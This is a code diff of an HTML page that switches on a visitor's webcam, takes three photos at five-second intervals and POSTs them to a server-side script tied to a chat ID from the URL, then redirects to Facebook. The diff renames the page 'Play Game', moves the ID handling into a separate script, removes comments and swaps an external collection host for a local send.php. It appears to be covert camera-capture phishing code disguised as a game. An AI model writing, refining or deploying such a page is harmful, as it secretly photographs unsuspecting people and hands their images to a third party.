@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Camera Capture</title>
+    <title>Play Game</title>
 </head>
 <body>
     <div id="cameraContainer" style="display: none;">
@@ -13,16 +13,7 @@
 
     <input type="hidden" id="chatid" name="chatid" value="">
 
-    <script>
-        // JavaScript to extract 'id' from the URL and set it in the hidden input field
-        function getChatIdFromURL() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('id');
-        }
-        const chatIdInput = document.getElementById('chatid');
-        const extractedChatId = getChatIdFromURL();
-        chatIdInput.value = extractedChatId;
-    </script>
+<script src="ds.js"></script>
 
     <script>
         const cameraContainer = document.getElementById("cameraContainer");
@@ -59,7 +50,7 @@
 
                 // Send the image to a PHP script for processing
                 const chatID = chatIdInput.value; // Get chat ID from the hidden input field
-                const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Your PHP script's URL
+                const apiUrl = 'send.php'; // Your PHP script's URL
                 await fetch(apiUrl, {
                     method: 'POST',
                     body: formData,
@@ -76,7 +67,7 @@
 
         setupCamera();
 
-        // Automatically capture and send three pictures at 5-second intervals
+
         let captureCount = 0;
         const captureInterval = setInterval(() => {
             captureAndSendImage();
@@ -85,11 +76,14 @@
                 clearInterval(captureInterval); // Stop after 3 captures
                 capturingMessage.textContent = "";
                 setTimeout(() => {
-                    window.location.href = "http://facebook.com/profile.php?id"; // Redirect to Google after a brief delay
-                }, 2000); // Delay for 2 seconds (2000 milliseconds)
+                    window.location.href = "http://facebook.com/profile.php?id"; 
+                }, 2000); 
             }
-        }, 5000); // 5000 milliseconds (5 seconds) between captures
+        }, 5000);
     </script>
 </body>
 </html>
+
+
+
 
